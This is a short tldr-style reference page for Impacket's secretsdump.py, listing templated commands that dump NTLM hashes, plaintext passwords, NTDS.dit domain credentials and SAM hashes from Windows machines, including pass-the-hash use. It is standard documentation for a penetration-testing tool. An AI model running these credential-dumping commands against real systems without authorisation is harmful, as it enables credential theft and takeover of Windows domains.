# secretsdump.py

> Dump NTLM hashes, plaintext passwords, and domain credentials from remote Windows systems.
> Part of the Impacket suite.
> More information: <https://github.com/fortra/impacket>.

- Dump credentials from a Windows machine using a username and password:

`secretsdump.py {{domain}}/{{username}}:{{password}}@{{target}}`

- Dump hashes from a machine using pass-the-hash authentication:

`secretsdump.py -hashes {{LM_Hash}}:{{NT_Hash}} {{username}}@{{target}}`

- Dump credentials from Active Directory’s NTDS.dit file:

`secretsdump.py -just-dc {{domain}}/{{username}}:{{password}}@{{target}}`

- Extract credentials from a local SAM database:

`secretsdump.py -sam {{path_to_SAM}} -system {{path_to_SYSTEM}}`

- Dump hashes from a machine without executing commands (pass-the-hash attack):

`secretsdump.py -no-pass {{username}}@{{target}}`
